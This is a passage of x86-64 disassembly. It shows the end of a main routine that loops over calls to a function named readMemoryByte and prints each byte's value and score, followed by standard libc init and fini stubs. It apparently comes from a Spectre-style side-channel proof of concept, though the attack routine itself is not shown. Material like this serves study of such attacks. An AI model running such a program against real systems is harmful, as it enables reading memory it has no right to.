 ca4:	e8 a7 f9 ff ff       	call   650 <__isoc99_sscanf@plt>
 ca9:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
 cac:	89 c6                	mov    esi,eax
 cae:	48 8d 3d dc 01 00 00 	lea    rdi,[rip+0x1dc]        # e91 <_IO_stdin_used+0x41>
 cb5:	b8 00 00 00 00       	mov    eax,0x0
 cba:	e8 81 f9 ff ff       	call   640 <printf@plt>
 cbf:	e9 d5 00 00 00       	jmp    d99 <main+0x1b9>
 cc4:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
 cc8:	48 89 c6             	mov    rsi,rax
 ccb:	48 8d 3d d6 01 00 00 	lea    rdi,[rip+0x1d6]        # ea8 <_IO_stdin_used+0x58>
 cd2:	b8 00 00 00 00       	mov    eax,0x0
 cd7:	e8 64 f9 ff ff       	call   640 <printf@plt>
 cdc:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
 ce0:	48 8d 50 01          	lea    rdx,[rax+0x1]
 ce4:	48 89 55 e0          	mov    QWORD PTR [rbp-0x20],rdx
 ce8:	48 8d 55 ec          	lea    rdx,[rbp-0x14]
 cec:	48 8d 4d f6          	lea    rcx,[rbp-0xa]
 cf0:	48 89 ce             	mov    rsi,rcx
 cf3:	48 89 c7             	mov    rdi,rax
 cf6:	e8 cc fa ff ff       	call   7c7 <readMemoryByte>
 cfb:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
 cfe:	8b 55 f0             	mov    edx,DWORD PTR [rbp-0x10]
 d01:	01 d2                	add    edx,edx
 d03:	39 d0                	cmp    eax,edx
 d05:	7c 09                	jl     d10 <main+0x130>
 d07:	48 8d 05 ba 01 00 00 	lea    rax,[rip+0x1ba]        # ec8 <_IO_stdin_used+0x78>
 d0e:	eb 07                	jmp    d17 <main+0x137>
 d10:	48 8d 05 b9 01 00 00 	lea    rax,[rip+0x1b9]        # ed0 <_IO_stdin_used+0x80>
 d17:	48 89 c6             	mov    rsi,rax
 d1a:	48 8d 3d b7 01 00 00 	lea    rdi,[rip+0x1b7]        # ed8 <_IO_stdin_used+0x88>
 d21:	b8 00 00 00 00       	mov    eax,0x0
 d26:	e8 15 f9 ff ff       	call   640 <printf@plt>
 d2b:	8b 55 ec             	mov    edx,DWORD PTR [rbp-0x14]
 d2e:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d32:	3c 1f                	cmp    al,0x1f
 d34:	76 11                	jbe    d47 <main+0x167>
 d36:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d3a:	3c 7e                	cmp    al,0x7e
 d3c:	77 09                	ja     d47 <main+0x167>
 d3e:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
 d42:	0f b6 c0             	movzx  eax,al
 d45:	eb 07                	jmp    d4e <main+0x16e>
 d47:	48 8d 05 8f 01 00 00 	lea    rax,[rip+0x18f]        # edd <_IO_stdin_used+0x8d>
 d4e:	0f b6 4d f6          	movzx  ecx,BYTE PTR [rbp-0xa]
 d52:	0f b6 f1             	movzx  esi,cl
 d55:	89 d1                	mov    ecx,edx
 d57:	48 89 c2             	mov    rdx,rax
 d5a:	48 8d 3d 7e 01 00 00 	lea    rdi,[rip+0x17e]        # edf <_IO_stdin_used+0x8f>
 d61:	b8 00 00 00 00       	mov    eax,0x0
 d66:	e8 d5 f8 ff ff       	call   640 <printf@plt>
 d6b:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
 d6e:	85 c0                	test   eax,eax
 d70:	7e 1d                	jle    d8f <main+0x1af>
 d72:	8b 55 f0             	mov    edx,DWORD PTR [rbp-0x10]
 d75:	0f b6 45 f7          	movzx  eax,BYTE PTR [rbp-0x9]
 d79:	0f b6 c0             	movzx  eax,al
 d7c:	89 c6                	mov    esi,eax
 d7e:	48 8d 3d 7b 01 00 00 	lea    rdi,[rip+0x17b]        # f00 <_IO_stdin_used+0xb0>
 d85:	b8 00 00 00 00       	mov    eax,0x0
 d8a:	e8 b1 f8 ff ff       	call   640 <printf@plt>
 d8f:	bf 0a 00 00 00       	mov    edi,0xa
 d94:	e8 87 f8 ff ff       	call   620 <putchar@plt>
 d99:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
 d9c:	83 e8 01             	sub    eax,0x1
 d9f:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
 da2:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
 da5:	85 c0                	test   eax,eax
 da7:	0f 89 17 ff ff ff    	jns    cc4 <main+0xe4>
 dad:	b8 00 00 00 00       	mov    eax,0x0
 db2:	48 8b 4d f8          	mov    rcx,QWORD PTR [rbp-0x8]
 db6:	64 48 33 0c 25 28 00 	xor    rcx,QWORD PTR fs:0x28
 dbd:	00 00 
 dbf:	74 05                	je     dc6 <main+0x1e6>
 dc1:	e8 6a f8 ff ff       	call   630 <__stack_chk_fail@plt>
 dc6:	c9                   	leave  
 dc7:	c3                   	ret    
 dc8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
 dcf:	00 

0000000000000dd0 <__libc_csu_init>:
 dd0:	41 57                	push   r15
 dd2:	41 56                	push   r14
 dd4:	49 89 d7             	mov    r15,rdx
 dd7:	41 55                	push   r13
 dd9:	41 54                	push   r12
 ddb:	4c 8d 25 be 0f 20 00 	lea    r12,[rip+0x200fbe]        # 201da0 <__frame_dummy_init_array_entry>
 de2:	55                   	push   rbp
 de3:	48 8d 2d be 0f 20 00 	lea    rbp,[rip+0x200fbe]        # 201da8 <__init_array_end>
 dea:	53                   	push   rbx
 deb:	41 89 fd             	mov    r13d,edi
 dee:	49 89 f6             	mov    r14,rsi
 df1:	4c 29 e5             	sub    rbp,r12
 df4:	48 83 ec 08          	sub    rsp,0x8
 df8:	48 c1 fd 03          	sar    rbp,0x3
 dfc:	e8 f7 f7 ff ff       	call   5f8 <_init>
 e01:	48 85 ed             	test   rbp,rbp
 e04:	74 20                	je     e26 <__libc_csu_init+0x56>
 e06:	31 db                	xor    ebx,ebx
 e08:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
 e0f:	00 
 e10:	4c 89 fa             	mov    rdx,r15
 e13:	4c 89 f6             	mov    rsi,r14
 e16:	44 89 ef             	mov    edi,r13d
 e19:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
 e1d:	48 83 c3 01          	add    rbx,0x1
 e21:	48 39 dd             	cmp    rbp,rbx
 e24:	75 ea                	jne    e10 <__libc_csu_init+0x40>
 e26:	48 83 c4 08          	add    rsp,0x8
 e2a:	5b                   	pop    rbx
 e2b:	5d                   	pop    rbp
 e2c:	41 5c                	pop    r12
 e2e:	41 5d                	pop    r13
 e30:	41 5e                	pop    r14
 e32:	41 5f                	pop    r15
 e34:	c3                   	ret    
 e35:	90                   	nop
 e36:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 e3d:	00 00 00 

0000000000000e40 <__libc_csu_fini>:
 e40:	f3 c3                	repz ret 

Disassembly of section .fini:

0000000000000e44 <_fini>:
 e44:	48 83 ec 08          	sub    rsp,0x8
 e48:	48 83 c4 08          	add    rsp,0x8
 e4c:	c3                   	ret    
